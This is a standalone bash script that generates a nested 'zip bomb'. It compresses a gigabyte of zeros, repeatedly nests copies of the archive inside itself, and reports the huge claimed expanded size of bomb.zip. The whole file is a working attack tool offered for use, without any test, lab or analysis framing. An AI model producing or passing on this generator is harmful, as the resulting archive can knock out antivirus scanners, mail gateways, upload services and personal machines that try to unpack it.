#!/usr/bin/env bash

mkdir -p /tmp/zipbomb
dd if=/dev/zero bs=1M count=1024 | zip /tmp/zipbomb/garbage.zip -

i=0
while [ $i -lt 10 ]; do
  j=0
  while [ $j -lt 10 ]; do
    cp /tmp/zipbomb/garbage.zip /tmp/zipbomb/$j.zip
    j=$(($j + 1))
  done
  zip -9 /tmp/zipbomb/garbage.zip /tmp/zipbomb/?.zip
  i=$(($i + 1))
done

zip -9 bomb.zip /tmp/zipbomb/garbage.zip

rm -fr /tmp/zipbomb

which bc >&- 2>&- && {
  final=$(du -h bomb.zip | cut -d'	' -f1)
  size=$(bc <<< "10 ^ $i * 1000000 * 1024")
  readableSize=$(numfmt --to=iec-i --suffix=B $size) 2>&- && {
    echo $readableSize compressed into $final
  } || {
    echo "$size"B compressed into $final
  }
}
